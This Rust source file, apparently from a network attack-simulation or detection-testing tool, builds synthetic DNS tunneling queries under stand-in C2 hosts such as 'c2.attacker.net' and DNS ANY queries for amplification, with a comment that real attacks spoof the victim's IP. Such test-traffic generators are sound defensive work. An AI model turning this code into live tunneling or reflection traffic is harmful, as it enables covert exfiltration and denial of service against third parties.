//! DNS-based attacks
//!
//! DNS tunneling, amplification attacks.

use std::net::{IpAddr, SocketAddr};
use rand::Rng;

use crate::attacks::{AttackGenerator, AttackType};
use crate::generator::PacketRecord;

/// DNS tunneling generator
pub struct DnsTunnelingGenerator {
    domains: Vec<&'static str>,
}

impl DnsTunnelingGenerator {
    pub fn new() -> Self {
        Self {
            domains: vec![
                "tunnel.evil.com",
                "c2.attacker.net",
                "exfil.malware.org",
                "data.phish.io",
            ],
        }
    }
}

impl Default for DnsTunnelingGenerator {
    fn default() -> Self {
        Self::new()
    }
}

impl AttackGenerator for DnsTunnelingGenerator {
    fn generate(&mut self, count: usize, target: IpAddr, src_ip: IpAddr) -> Vec<PacketRecord> {
        let mut records = Vec::with_capacity(count);
        let mut rng = rand::thread_rng();

        for i in 0..count {
            let src_port: u16 = rng.gen_range(1024..65535);
            let src = SocketAddr::new(src_ip, src_port);
            let dst = SocketAddr::new(target, 53);

            // Generate base64-like subdomain for tunneling
            let data_len = rng.gen_range(20..60);
            let data: String = (0..data_len)
                .map(|_| {
                    let idx = rng.gen_range(0..62);
                    if idx < 26 { (b'a' + idx as u8) as char }
                    else if idx < 52 { (b'A' + (idx - 26) as u8) as char }
                    else { (b'0' + (idx - 52) as u8) as char }
                })
                .collect();

            let domain = self.domains[rng.gen_range(0..self.domains.len())];

            // Build DNS query payload (simplified)
            // Real DNS query format: [len][label][len][label]...[0][qtype][qclass]
            let query = format!("{}.{}", data, domain);
            let dns_payload = build_dns_query(&query);

            let record = PacketRecord::new(i as u64, AttackType::DnsTunneling)
                .with_udp(src, dst, &dns_payload);

            records.push(record);
        }

        records
    }

    fn attack_type(&self) -> AttackType {
        AttackType::DnsTunneling
    }

    fn description(&self) -> &'static str {
        "DNS tunneling - exfiltrates data via DNS queries"
    }
}

/// DNS amplification generator
pub struct DnsAmplificationGenerator;

impl DnsAmplificationGenerator {
    pub fn new() -> Self {
        Self
    }
}

impl Default for DnsAmplificationGenerator {
    fn default() -> Self {
        Self::new()
    }
}

impl AttackGenerator for DnsAmplificationGenerator {
    fn generate(&mut self, count: usize, target: IpAddr, src_ip: IpAddr) -> Vec<PacketRecord> {
        let mut records = Vec::with_capacity(count);
        let mut rng = rand::thread_rng();

        // DNS amplification uses ANY queries to get large responses
        let amplification_domains = [
            "google.com",
            "facebook.com",
            "cloudflare.com",
            "amazon.com",
            "microsoft.com",
        ];

        for i in 0..count {
            // In real attack, src_ip would be spoofed to victim's IP
            let src_port: u16 = rng.gen_range(1024..65535);
            let src = SocketAddr::new(src_ip, src_port);
            let dst = SocketAddr::new(target, 53);

            let domain = amplification_domains[rng.gen_range(0..amplification_domains.len())];
            let dns_payload = build_dns_any_query(domain);

            let record = PacketRecord::new(i as u64, AttackType::DnsAmplification)
                .with_udp(src, dst, &dns_payload);

            records.push(record);
        }

        records
    }

    fn attack_type(&self) -> AttackType {
        AttackType::DnsAmplification
    }

    fn description(&self) -> &'static str {
        "DNS amplification - uses ANY queries for reflection attack"
    }
}

/// Build a simple DNS query packet
fn build_dns_query(domain: &str) -> Vec<u8> {
    let mut packet = Vec::new();

    // Transaction ID (random)
    let mut rng = rand::thread_rng();
    let tx_id: u16 = rng.gen();
    packet.extend_from_slice(&tx_id.to_be_bytes());

    // Flags: standard query
    packet.extend_from_slice(&[0x01, 0x00]); // QR=0, OPCODE=0, AA=0, TC=0, RD=1

    // Question count: 1
    packet.extend_from_slice(&[0x00, 0x01]);
    // Answer count: 0
    packet.extend_from_slice(&[0x00, 0x00]);
    // Authority count: 0
    packet.extend_from_slice(&[0x00, 0x00]);
    // Additional count: 0
    packet.extend_from_slice(&[0x00, 0x00]);

    // Query name
    for label in domain.split('.') {
        packet.push(label.len() as u8);
        packet.extend_from_slice(label.as_bytes());
    }
    packet.push(0x00); // End of name

    // Query type: A (1)
    packet.extend_from_slice(&[0x00, 0x01]);
    // Query class: IN (1)
    packet.extend_from_slice(&[0x00, 0x01]);

    packet
}

/// Build DNS ANY query for amplification
fn build_dns_any_query(domain: &str) -> Vec<u8> {
    let mut packet = Vec::new();

    // Transaction ID
    let mut rng = rand::thread_rng();
    let tx_id: u16 = rng.gen();
    packet.extend_from_slice(&tx_id.to_be_bytes());

    // Flags: standard query with recursion desired
    packet.extend_from_slice(&[0x01, 0x00]);

    // Counts
    packet.extend_from_slice(&[0x00, 0x01]); // Questions
    packet.extend_from_slice(&[0x00, 0x00]); // Answers
    packet.extend_from_slice(&[0x00, 0x00]); // Authority
    packet.extend_from_slice(&[0x00, 0x00]); // Additional

    // Query name
    for label in domain.split('.') {
        packet.push(label.len() as u8);
        packet.extend_from_slice(label.as_bytes());
    }
    packet.push(0x00);

    // Query type: ANY (255)
    packet.extend_from_slice(&[0x00, 0xff]);
    // Query class: IN (1)
    packet.extend_from_slice(&[0x00, 0x01]);

    packet
}
